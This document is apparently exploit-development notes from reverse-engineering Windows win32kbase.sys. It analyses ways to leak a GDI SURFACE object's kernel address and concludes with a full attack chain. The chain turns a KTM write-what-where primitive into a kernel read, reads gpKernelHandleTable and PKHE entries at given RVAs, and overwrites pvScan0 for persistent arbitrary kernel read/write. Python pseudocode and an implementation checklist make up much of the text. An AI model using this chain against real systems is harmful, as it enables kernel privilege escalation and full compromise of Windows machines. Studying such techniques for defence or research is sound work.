# GDI SURFACE Kernel Address Leak Analysis

## Executive Summary

**The real kernel address of a GDI SURFACE object cannot be directly leaked from user mode on modern Windows 10/11.** The user-mode GDI handle table (`PEB.GdiSharedHandleTable`) contains an **encoded** value (`0xFFFFFFFFFF000000 | handle`) at offset 0 of each entry, confirmed by decompiling `ENTRYOBJ::hSetup` in `win32kbase.sys`. The real SURFACE address exists only in kernel-only structures: the PKHE table (`gpKernelHandleTable`) and the GdiHandleEntryTable page slots.

**The viable path requires converting the KTM write-what-where primitive into a kernel read**, then performing a two-step read: (1) read `gpKernelHandleTable` global from `win32kbase.sys` data section, (2) read the PKHE entry to get the SURFACE address. Once the SURFACE address is known, overwrite `pvScan0` at `SURFACE+72` to establish persistent arbitrary kernel read/write via `NtGdiGetBitmapBits`/`NtGdiSetBitmapBits`.

---

## 1. GDI Handle Table Architecture

### 1.1 Three-Layer Design

The GDI handle table on Windows 10/11 (build analyzed from `win32kbase.sys` and `win32kfull.sys` in IDA Pro) uses three layers:

| Layer | Structure | Location | Entry Size | Contains Real Address? |
|-------|-----------|----------|------------|----------------------|
| 1 (User) | PHE table | `PEB.GdiSharedHandleTable` (user-mode mapped) | 32 bytes | NO - encoded handle |
| 2 (Kernel) | GdiHandleEntryTable | `gpHandleManager` -> directory -> table -> page slots | 24 bytes (entry) + 16 bytes (page slot) | YES - in page slot at offset +8 |
| 3 (Kernel) | PKHE table | `gpKernelHandleTable` (session space) | 24 bytes | YES - at offset +0 (first QWORD) |

### 1.2 Layer 1: User-Mode PHE Table

**Initialization** (`HMInitHandleTable` at RVA `0x298B50`):
```c
// gpvSharedBase is the PHE table base, mapped into user mode
qword_1C024ED58 = gpvSharedBase;     // PHE table base pointer
dword_1C024ED60 = 32;                // PHE entry size = 32 bytes
```

**PHE Entry Layout** (32 bytes, user-accessible via `PEB.GdiSharedHandleTable`):
```
Offset 0:  QWORD = 0xFFFFFFFFFF000000 | handle  (ENCODED - NOT real address)
Offset 8:  DWORD = lock count / flags
Offset 12: WORD  = uniqueness (HIWORD of handle)
Offset 14: BYTE  = object type
Offset 15: BYTE  = flags (bit 5 = stock object, bit 6 = protected)
Offset 16-31: other metadata
```

**Encoding confirmed** by `ENTRYOBJ::hSetup` (RVA `0x1560`):
```c
// Critical line in hSetup:
*(_QWORD *)Entry = a4 | 0xFFFFFFFFFF000000uLL;
// a4 = handle value (index + uniqueness)
// Result: top 40 bits = 0xFFFFFFFFFF, bottom 24 bits = handle
```

### 1.3 Layer 2: Kernel GdiHandleManager

**Structure hierarchy** (from `HmgCreate` at RVA `0x6BCFC`):
```
gpHandleManager (RVA 0x250C00) -> GdiHandleManager (32 bytes)
  +0:  DWORD  maxIndex
  +4:  DWORD  currentCount  
  +8:  DWORD  maxGdiHandleCount
  +16: QWORD  -> GdiHandleEntryDirectory

GdiHandleEntryDirectory:
  +2:     WORD   baseShift
  +2056:  DWORD  baseIndex
  +8:     QWORD[] -> GdiHandleEntryTable[] (array of table pointers)

GdiHandleEntryTable:
  +0:  QWORD  -> entry array (24 bytes per entry)
  +20: DWORD  maxEntryCount
  +24: QWORD  -> page table (array of page pointers)

Page slot (16 bytes per slot, 256 slots per page):
  +0:  EX_PUSH_LOCK  pushlock
  +8:  QWORD          object pointer (REAL SURFACE ADDRESS)
```

**Object pointer lookup** (`GdiHandleEntryTable::GetEntryObject` at RVA `0x31360`):
```c
OBJECT* GetEntryObject(GdiHandleEntryTable *this, unsigned int index) {
    if (index >= *(DWORD*)(this + 20))  // bounds check
        return nullptr;
    // page_table = *(QWORD*)(this + 24)
    // page = page_table[index >> 8]
    // slot = page + 16 * (index & 0xFF)
    // object = *(QWORD*)(slot + 8)
    return *(OBJECT**)(*(QWORD*)(*(QWORD*)(*(QWORD*)(this + 24)) 
                        + 8 * (index >> 8)) 
                        + 16 * (index & 0xFF) + 8);
}
```

**Handle entry layout** (24 bytes, kernel-only):
```
Offset 0:  DWORD = handle value (low 24 bits = index)
Offset 4:  DWORD = (padding or owner PID)
Offset 8:  DWORD = lock count / flags (bit 0 = locked)
Offset 12: WORD  = uniqueness (HIWORD of handle)
Offset 14: BYTE  = object type
Offset 15: BYTE  = flags (bit 5 = stock, bit 6 = protected, bit 7 = preserve)
Offset 16: QWORD = (zeroed in hSetup, possibly used for linked list)
```

### 1.4 Layer 3: Kernel PKHE Table

**Initialization** (`InitKernelHandleTable` at RVA `0x299080`):
```c
// Create section of 0x180000 (1,572,864 bytes)
Win32CreateSection(&ghSectionKernelHandleTable, 983071, flags, &size);
// Map in kernel session space
MmMapViewInSessionSpace(ghSectionKernelHandleTable, &gpKernelHandleTable, &ViewSize);
```

**PKHE Entry Layout** (24 bytes = 3 QWORDs, kernel session space):
```
Offset 0:  QWORD = object pointer (REAL SURFACE ADDRESS)  <-- TARGET
Offset 8:  QWORD = free list link / metadata
Offset 16: QWORD = metadata
```

**Direct lookup** (`HMObjectFromHandle` at RVA `0x31AF0`):
```c
__int64 HMObjectFromHandle(unsigned __int16 handleIndex) {
    GetDomainLockRef(14);  // acquire handle manager lock
    // PKHE entry = gpKernelHandleTable + 24 * handleIndex
    // Object pointer = first QWORD of PKHE entry
    return *((_QWORD *)gpKernelHandleTable + 3 * handleIndex);
    // 3 * 8 = 24 bytes per entry, returns QWORD at offset 0
}
```

**PHE-to-PKHE conversion** (`HMPkheFromPhe` at RVA `0x314E0`):
```c
char* HMPkheFromPhe(__int64 pheAddr) {
    GetDomainLockRef(14);
    // Index = (PHE_addr - PHE_base) / 32
    // PKHE entry = gpKernelHandleTable + 24 * index
    return (char *)gpKernelHandleTable + 24 * (unsigned int)((pheAddr - qword_1C024ED58) >> 5);
}
```

**Object-to-PKHE conversion** (`HMPkheFromObject` at RVA `0x99B0`):
```c
char* HMPkheFromObject(_DWORD *object) {
    // Object's first DWORD contains the handle (low 16 bits = index)
    // PKHE entry = gpKernelHandleTable + 24 * index
    return (char *)gpKernelHandleTable + 24 * (unsigned __int16)*object;
}
```

### 1.5 Key RVAs in win32kbase.sys

IDA image base: `0x1C0000000`

| Symbol | IDA VA | RVA | Description |
|--------|--------|-----|-------------|
| `gpKernelHandleTable` | `0x1C024ED40` | `0x24ED40` | Session-space PKHE table base (runtime value) |
| `gpvSharedBase` | `0x1C024ED38` | `0x24ED38` | Shared handle table base |
| `qword_1C024ED58` | `0x1C024ED58` | `0x24ED58` | PHE table base (= gpvSharedBase) |
| `dword_1C024ED60` | `0x1C024ED60` | `0x24ED60` | PHE entry size (= 32) |
| `gpHandleManager` | `0x1C0250C00` | `0x250C00` | GdiHandleManager pointer |
| `gpGdiSharedMemory` | `0x1C02501E8` | `0x2501E8` | Shared memory base (session space) |
| `gpentHmgr` | `0x1C0250C18` | `0x250C18` | Entry array base |
| `ghSectionKernelHandleTable` | `0x1C0251530` | `0x251530` | PKHE section handle |
| `ghSectionShared` | `0x1C0251478` | `0x251478` | Shared section handle |

### 1.6 SURFACE Object Layout

From decompiling `GreGetBitmapBits` and `bDoGetSetBitmapBits` in `win32kfull.sys`:

```
SURFACE Object:
  +0:   HMOBJ header (QWORD: handle value with uniqueness)
  +8:   reference count / flags
  +24:  SURFOBJ (embedded)
    SURFOBJ+0:  DHSURF dhsurf       (8 bytes)
    SURFOBJ+8:  DHPDEV dhpdev       (8 bytes)
    SURFOBJ+16: HDEV   hdev         (8 bytes)
    SURFOBJ+24: HSURF  hsurf        (8 bytes)
    SURFOBJ+32: ULONG  lDelta       (4 bytes, scanline stride)
    SURFOBJ+36: ULONG  cjBits       (4 bytes)
    SURFOBJ+40: PVOID  pvBits       (8 bytes, bitmap bits base)
    SURFOBJ+48: PVOID  pvScan0      (8 bytes, first scanline) <-- TARGET
    SURFOBJ+56: ULONG  iUniq        (4 bytes)
    SURFOBJ+60: ULONG  iBitmapFormat (4 bytes)
  +56:  SIZEL  sizlBitmap.cx       (redundant with SURFOBJ)
  +60:  SIZEL  sizlBitmap.cy
  +96:  ULONG  iBitmapFormat
  +112: ULONG  flags (0x4000000 = bitmap flag)
```

**pvScan0 offset in SURFACE = +72 (0x48)**

### 1.7 Python Calculation: Handle to SURFACE Address

```python
# Given:
win32kbase_base = <from NtQuerySystemInformation(SystemModuleInformation)>
gpKernelHandleTable_rva = 0x24ED40
pkhe_entry_size = 24

bitmap_handle = 0x05010A5C  # example GDI handle from CreateBitmap
handle_index = bitmap_handle & 0xFFFF  # low 16 bits = 0x0A5C

# Step 1: Address of gpKernelHandleTable global variable
gpKernelHandleTable_global_addr = win32kbase_base + gpKernelHandleTable_rva

# Step 2: Read the value (requires kernel READ)
gpKernelHandleTable = read_qword(gpKernelHandleTable_global_addr)
# This is the session-space base of the PKHE table

# Step 3: Compute PKHE entry address
pkhe_entry_addr = gpKernelHandleTable + pkhe_entry_size * handle_index

# Step 4: Read SURFACE address (requires kernel READ)
surface_addr = read_qword(pkhe_entry_addr)
# This is the real kernel address of the SURFACE object

# Step 5: Compute pvScan0 address
pvscan0_addr = surface_addr + 72  # 0x48

# Step 6: Overwrite pvScan0 (requires kernel WRITE)
write_qword(pvscan0_addr, target_kernel_addr)

# Step 7: Use bitmap for arbitrary R/W
# NtGdiGetBitmapBits(bitmap_handle, size, user_buf) -> reads from target_kernel_addr
# NtGdiSetBitmapBits(bitmap_handle, size, user_buf) -> writes to target_kernel_addr
```

---

## 2. Approach Analysis: Leaking the SURFACE Address

### 2.1 PEB.GdiSharedHandleTable (User-Mode Table)

**Verdict: NO-GO**

The user-mode GDI handle table is accessible via `PEB.GdiSharedHandleTable` (offset `0x1C88` in PEB on x64 Windows 10/11). Each entry is 32 bytes. However, decompilation of `ENTRYOBJ::hSetup` confirms that offset 0 of each entry is set to:

```
Entry[0] = handle | 0xFFFFFFFFFF000000
```

This is an **encoded handle value**, not a real kernel pointer. The top 40 bits are always `0xFFFFFFFFFF`. Only the bottom 24 bits carry the handle value (16-bit index + 8-bit uniqueness).

On older Windows (Win7/Win8), this field contained the real `pKernelAddress` of the GDI object. Microsoft replaced this with the encoded value to prevent exactly this class of kernel address leak.

The real SURFACE address is **not present** anywhere in the user-mode PHE entry.

### 2.2 NtGdiGetEntry

**Verdict: NO-GO**

`NtGdiGetEntry` (RVA `0xAB2B0` in `win32kbase.sys`) copies 24 bytes of the handle table entry to a user-mode buffer:

```c
__int64 NtGdiGetEntry(unsigned int handle, unsigned __int64 userBuf) {
    Entry = GdiHandleEntryDirectory::GetEntry(directory, decodedIndex, 0);
    if (!Entry) return STATUS_NOT_FOUND;
    // Copy 24 bytes to user mode
    *(_OWORD *)userBuf = *(_OWORD *)Entry;        // first 16 bytes
    *(_QWORD *)(userBuf + 16) = *((_QWORD *)Entry + 2);  // next 8 bytes
    return STATUS_SUCCESS;
}
```

The 24-byte entry contains:
- Offset 0: `0xFFFFFFFFFF000000 | handle` (encoded, same as PHE)
- Offset 8: lock count / flags
- Offset 12: uniqueness
- Offset 14: type
- Offset 15: flags
- Offset 16: zeroed (from `hSetup`)

The **real object pointer is NOT in the entry**. It is in the separate page slot structure at `page_table[index>>8] + 16*(index&0xFF) + 8`. `NtGdiGetEntry` does not copy the page slot data.

### 2.3 NtGdiGetStats

**Verdict: NO-GO**

`NtGdiGetStats` (RVA `0x13F480`) has a debug privilege check:
```c
v9 = (RtlGetNtGlobalFlags() & 0x400) == 0 ? STATUS_ACCESS_DENIED : 0;
```

It requires `NtGlobalFlags & 0x400` (FLG_KERNEL_DEBUGGING or similar). Even when enabled, it only returns status codes (enumerates entries and checks ownership), never kernel addresses.

### 2.4 NtQuerySystemInformation - GDI Classes

**Verdict: NO-GO**

Searched `ntoskrnl.exe` for GDI-related system information classes. Found zero matches for `SystemGdiHandle`, `SystemGdiDriver`, or `GdiHandle` strings. There are no `NtQuerySystemInformation` info classes that expose GDI handle table kernel addresses.

`SystemHandleInformation` (class `0x10`) only covers NT object manager handles, not GDI handles. GDI handles are managed by `win32kbase.sys` in a completely separate handle table. `DuplicateHandle` fails with `gle=6` (ERROR_INVALID_HANDLE) for GDI handles because the NT object manager does not know about them.

### 2.5 NtQuerySystemInformation - SystemModuleInformation

**Verdict: PARTIAL (gives module base, not object address)**

`SystemModuleInformation` (class `0x0B`) returns `RTL_PROCESS_MODULES` containing kernel module base addresses:

```c
typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES;

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;    // <-- kernel base address of the module
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION;
```

On modern Windows (10 1709+), calling `NtQuerySystemInformation(SystemModuleInformation)` requires `SeDebugPrivilege`. An admin process can enable this privilege.

This gives us the **base address of `win32kbase.sys`**, which allows computing:
- `gpKernelHandleTable` global variable address = `win32kbase_base + 0x24ED40`
- `gpHandleManager` global variable address = `win32kbase_base + 0x250C00`

But the **value** at `gpKernelHandleTable` is a runtime session-space pointer set by `MmMapViewInSessionSpace`. We still need a kernel read to retrieve this value.

### 2.6 Cache Timing Side-Channel

**Verdict: NO-GO**

Theoretical approach: time handle table lookups to infer cache line addresses, then infer the PKHE table base from cache behavior.

Rejected because:
- Requires nanosecond-precision timing from user mode ( thwarted by `KeQueryPerformanceCounter` granularity and context switches)
- Cache side-channels on kernel data are extremely unreliable across CPU generations
- Would only reveal cache line addresses, not specific pointer values
- Spectre-type attacks on kernel memory require specific gadget conditions and are mitigated by recent microcode updates

### 2.7 Error Code Differential

**Verdict: NO-GO**

GDI handle validation uses fixed error codes:
- `ERROR_INVALID_HANDLE` (6) for invalid handles
- `ERROR_NOT_ENOUGH_MEMORY` (8) for quota exceeded
- `ERROR_ACCESS_DENIED` (5) for cross-session access

No differential information leaks based on object address, pool location, or table index. The error paths in `HmgShareLockCheck` collapse to the same failure modes regardless of the object's kernel address.

### 2.8 NtGdiGetBitmapBits Data Inference

**Verdict: NO-GO for address leak, GO for post-exploitation verification**

`NtGdiGetBitmapBits` returns pixel data from `pvScan0 + offset`. The pixel data is the actual bitmap content, not metadata about the SURFACE object. You cannot infer the SURFACE kernel address from the pixel data.

However, once you HAVE the SURFACE address and have overwritten `pvScan0`, you can use `NtGdiGetBitmapBits` to:
- Read arbitrary kernel memory (point `pvScan0` at target, read bits)
- Verify the address is correct (read known data and compare)

### 2.9 PEB Handle Cache (bPEBCacheHandle)

**Verdict: NO-GO**

`bPEBCacheHandle` (RVA `0x36120`) caches recently used GDI handles in the PEB for performance. The cache stores:

```c
*v36 = v70;  // v70 = *(_QWORD *)object = handle value (ENCODED)
```

The cached value is the **encoded handle** (`0xFFFFFFFFFF000000 | handle`), not the real kernel address. The PEB cache exists at:
- `PEB + 8 * (gCacheHandleOffsets[type] + 43)` - handle cache slots
- `PEB + 320` (0x140) - KPCR self pointer (set during init, not GDI-related)
- `PEB + 4 * type + 328` - handle cache count

No kernel object addresses are stored in the PEB cache.

### 2.10 Bitmap Spray + Section Base Computation

**Verdict: NO-GO without additional kernel address leak**

Bitmaps are allocated from GDI lookaside lists (initialized in `HmgCreate`):
```c
HmgInitializeLookAsideList(5u, SURFACE::tSize + 256, ...);  // Type 5 = SURFACE
```

The lookaside lists allocate from kernel session pool. Pool addresses are randomized by kernel ASLR. Even if we spray 2000 bitmaps:
- They go into ~10 sections of 44 pages each (0x2C000 bytes per section)
- The section base addresses are in kernel session space, randomized
- We cannot compute the SURFACE address without knowing at least one kernel address in the same session space region

`MmMapViewInSessionSpace` return values (the mapped addresses) are only available to kernel code. No user-mode API exposes session space mapping addresses.

### 2.11 KTM Write-What-Where to Read Primitive

**Verdict: GO - most promising approach**

If we have a write-what-where primitive from KTM (Kernel Transaction Manager) exploitation, we can potentially convert it to a read primitive.

**Write primitive mechanics** (via `RemoveEntryList` corruption):
```c
// RemoveEntryList reads Flink and Blink, then writes:
//   *(QWORD*)(Blink + 0) = Flink   (write Flink value to Blink address)
//   *(QWORD*)(Flink + 8) = Blink   (write Blink value to Flink+8 address)
```

This gives us two controlled writes. But `RemoveEntryList` itself does not read from the target addresses (it only writes to them).

**Read primitive via list traversal**: If the kernel **traverses** a list after we corrupt it, the traversal reads `Flink->Flink` at each step. If we set `Flink` to point at `gpKernelHandleTable` global, the kernel reads `*(QWORD*)(gpKernelHandleTable_addr)` as the "next entry" pointer. If this value is then:
- Written to a user-observable location (e.g., an IOCTL output buffer, a shared structure)
- Used to index into an array that's copied to user mode
- Stored in a field that can be queried later

...then we get a kernel read.

**Specific technique**: Corrupt a KTM `LIST_ENTRY` so that during transaction rollback or enlistment cleanup, the kernel traverses the list and copies data through our controlled pointer. The exact KTM structure and traversal point depends on the specific KTM vulnerability being exploited.

**Alternative read technique**: Use the write-what-where to patch a kernel structure that's later copied to user mode:
1. Find a structure with a pointer field that gets copied to user mode via an `NtQueryInformation*` or IOCTL
2. Overwrite that pointer field to point at `gpKernelHandleTable` global
3. When the query/IOCTL fires, the kernel copies `*(QWORD*)(gpKernelHandleTable_addr)` to the user buffer
4. We now have the PKHE table base address

### 2.12 Direct Global Read via Write-What-Where

**Verdict: GO - requires kernel read primitive (from 2.11)**

Once we have ANY kernel read primitive (even a single 8-byte read):

1. **Read `gpKernelHandleTable`**: Read 8 bytes from `win32kbase_base + 0x24ED40`
   - This gives the session-space base of the PKHE table

2. **Read SURFACE address**: Read 8 bytes from `gpKernelHandleTable + 24 * handle_index`
   - `handle_index = bitmap_handle & 0xFFFF`
   - The value is the real SURFACE kernel address

3. **Overwrite `pvScan0`**: Write 8 bytes to `surface_addr + 72`
   - Set `pvScan0` to any target kernel address
   - This establishes persistent arbitrary R/W via bitmap operations

### 2.13 Full Attack Chain

**Verdict: GO**

```
[NtQuerySystemInformation(0x0B)] 
    -> win32kbase.sys base address (requires SeDebugPrivilege)
    
[Compute global addresses]
    -> gpKernelHandleTable @ win32kbase_base + 0x24ED40
    -> gpHandleManager     @ win32kbase_base + 0x250C00
    
[KTM write-what-where -> read primitive]
    -> Read *(QWORD*)(win32kbase_base + 0x24ED40) = gpKernelHandleTable value
    -> Read *(QWORD*)(gpKernelHandleTable + 24 * (bitmap_handle & 0xFFFF)) = SURFACE address
    
[Write-what-where -> overwrite pvScan0]
    -> Write target_addr to *(QWORD*)(SURFACE + 72)
    
[Persistent arbitrary R/W via bitmap]
    -> NtGdiGetBitmapBits(bitmap, size, buf) = kernel READ from target_addr
    -> NtGdiSetBitmapBits(bitmap, size, buf) = kernel WRITE to target_addr
```

---

## 3. Pseudocode: Complete Exploitation Flow

```python
# ============================================================
# Phase 1: Get win32kbase.sys base address
# ============================================================

def get_win32kbase_base():
    """Get win32kbase.sys kernel base via NtQuerySystemInformation"""
    # Enable SeDebugPrivilege first
    enable_privilege(SeDebugPrivilege)
    
    # Query SystemModuleInformation (class 0x0B)
    buf = NtQuerySystemInformation(SystemModuleInformation=0x0B)
    modules = parse_rtl_process_modules(buf)
    
    for mod in modules:
        if "win32kbase.sys" in mod.FullPathName:
            return mod.ImageBase
    
    raise Exception("win32kbase.sys not found")

# ============================================================
# Phase 2: Get gpKernelHandleTable value (requires kernel read)
# ============================================================

WIN32KBASE_GPKERNELHANDLETABLE_RVA = 0x24ED40
PKHE_ENTRY_SIZE = 24

def get_pkhe_table_base(win32kbase_base, kernel_read_func):
    """Read gpKernelHandleTable global from win32kbase.sys data section"""
    global_addr = win32kbase_base + WIN32KBASE_GPKERNELHANDLETABLE_RVA
    pkhe_table_base = kernel_read_func(global_addr, 8)  # read 8 bytes
    return pkhe_table_base

# ============================================================
# Phase 3: Get SURFACE address from PKHE
# ============================================================

def get_surface_addr(pkhe_table_base, bitmap_handle, kernel_read_func):
    """Read SURFACE address from PKHE entry"""
    handle_index = bitmap_handle & 0xFFFF
    pkhe_entry_addr = pkhe_table_base + PKHE_ENTRY_SIZE * handle_index
    surface_addr = kernel_read_func(pkhe_entry_addr, 8)  # read 8 bytes
    return surface_addr

# ============================================================
# Phase 4: Overwrite pvScan0 for persistent R/W
# ============================================================

PVSCAN0_OFFSET_IN_SURFACE = 72  # 0x48

def setup_bitmap_rww(surface_addr, kernel_write_func):
    """Overwrite pvScan0 to enable bitmap-based R/W"""
    pvscan0_addr = surface_addr + PVSCAN0_OFFSET_IN_SURFACE
    # pvScan0 currently points to the bitmap's pixel data
    # Save original pvScan0 for restoration
    original_pvscan0 = kernel_read_func(pvscan0_addr, 8)
    return pvscan0_addr, original_pvscan0

def arbitrary_kernel_read(bitmap_handle, target_addr, size, kernel_write_func):
    """Read arbitrary kernel memory via bitmap"""
    # Set pvScan0 to target address
    kernel_write_func(pvscan0_addr, target_addr)
    # Read bitmap bits (reads from target_addr)
    buf = NtGdiGetBitmapBits(bitmap_handle, size, output_buf)
    return buf

def arbitrary_kernel_write(bitmap_handle, target_addr, data, kernel_write_func):
    """Write arbitrary kernel memory via bitmap"""
    # Set pvScan0 to target address
    kernel_write_func(pvscan0_addr, target_addr)
    # Write bitmap bits (writes to target_addr)
    NtGdiSetBitmapBits(bitmap_handle, len(data), data)

# ============================================================
# Phase 5: KTM Write-to-Read Conversion (sketch)
# ============================================================

def ktm_write_to_read(target_read_addr, ktm_write_what_where):
    """Convert KTM write primitive to single kernel read"""
    # This is KTM-vulnerability-specific.
    # General approach:
    #
    # 1. Find a kernel structure S that:
    #    a. Contains a LIST_ENTRY that gets traversed
    #    b. The traversal result is copied to user-observable location
    #
    # 2. Corrupt the LIST_ENTRY:
    #    a. Set Entry->Flink = target_read_addr
    #    b. Set Entry->Blink = address_of_user_observable_output - 0
    #       (so Blink->Flink write puts Flink value into observable output)
    #
    # 3. Trigger traversal (e.g., close KTM handle, rollback transaction)
    #
    # 4. The kernel reads *(QWORD*)(target_read_addr) as "next entry"
    #    and writes it to Blink->Flink = observable output
    #
    # 5. Read the observable output to get the kernel data
    #
    # CAVEAT: RemoveEntryList writes Flink TO Blink, not reads FROM Blink.
    # Need a traversal that READS from controlled address and STORES result.
    # 
    # Alternative: Use write to patch a pointer in a structure that's
    # later copied to user mode by a syscall (NtQueryInformation*, IOCTL).
    pass
```

---

## 4. Summary Table

| # | Method | Verdict | Notes |
|---|--------|---------|-------|
| 1 | PEB.GdiSharedHandleTable | **NO-GO** | Contains encoded handle, not real address |
| 2 | NtGdiGetEntry | **NO-GO** | Copies entry with encoded handle, not object ptr |
| 3 | NtGdiGetStats | **NO-GO** | Requires debug flags, returns status only |
| 4 | NtQuerySystemInfo (GDI) | **NO-GO** | No GDI info classes exist in ntoskrnl |
| 5 | NtQuerySystemInfo (Modules) | **PARTIAL** | Gives win32kbase base, not gpKernelHandleTable value |
| 6 | Cache timing | **NO-GO** | Impractical, unreliable |
| 7 | Error code differential | **NO-GO** | Fixed error codes, no address-dependent behavior |
| 8 | BitmapBits inference | **NO-GO** | Returns pixel data, not addresses |
| 9 | PEB handle cache | **NO-GO** | Stores encoded handles, not real addresses |
| 10 | Spray + compute | **NO-GO** | Pool ASLR prevents address computation |
| 11 | KTM write->read | **GO** | Most promising: convert write to read via list traversal |
| 12 | Read gpKernelHandleTable | **GO** | Requires kernel read from step 11 |
| 13 | Full chain | **GO** | ModuleInfo + write-to-read + PKHE read + pvScan0 overwrite |

---

## 5. Critical Path Forward

The **only viable path** to obtaining the SURFACE kernel address is:

1. **Get `win32kbase.sys` base** via `NtQuerySystemInformation(SystemModuleInformation)` with `SeDebugPrivilege`
2. **Convert the KTM write-what-where into a kernel read** by corrupting a KTM structure that causes the kernel to copy data from a controlled address to a user-observable location
3. **Read `gpKernelHandleTable`** (8 bytes at `win32kbase_base + 0x24ED40`) to get the PKHE session-space base
4. **Read the PKHE entry** (8 bytes at `gpKernelHandleTable + 24 * (bitmap_handle & 0xFFFF)`) to get the SURFACE address
5. **Overwrite `pvScan0`** (8 bytes at `SURFACE + 72`) to redirect bitmap I/O to arbitrary kernel addresses
6. **Use `NtGdiGetBitmapBits`/`NtGdiSetBitmapBits`** for stable, repeatable arbitrary kernel read/write

The critical bottleneck is **step 2**: converting the write primitive into a read. This requires KTM-vulnerability-specific analysis of which list traversals copy traversed data to user-observable locations.

---

## 6. Key Data Points for Implementation

```
win32kbase.sys RVAs (image base = 0x1C0000000 in IDA):
  gpKernelHandleTable:      RVA 0x24ED40  (QWORD: PKHE table base in session space)
  gpHandleManager:          RVA 0x250C00  (QWORD: GdiHandleManager object pointer)
  gpentHmgr:                RVA 0x250C18  (QWORD: entry array base)
  gpGdiSharedMemory:        RVA 0x2501E8  (QWORD: shared memory session base)

PKHE entry: 24 bytes
  +0: QWORD = SURFACE address (target)
  
PHE entry: 32 bytes (user-mode accessible, but encoded)
  +0: QWORD = 0xFFFFFFFFFF000000 | handle (NOT real address)

SURFACE object:
  +0:  QWORD = handle value (HMOBJ header)
  +72: QWORD = pvScan0 (overwrite target for R/W primitive)
  
SURFOBJ (embedded at SURFACE+24):
  +48: PVOID = pvScan0 (same as SURFACE+72)
```
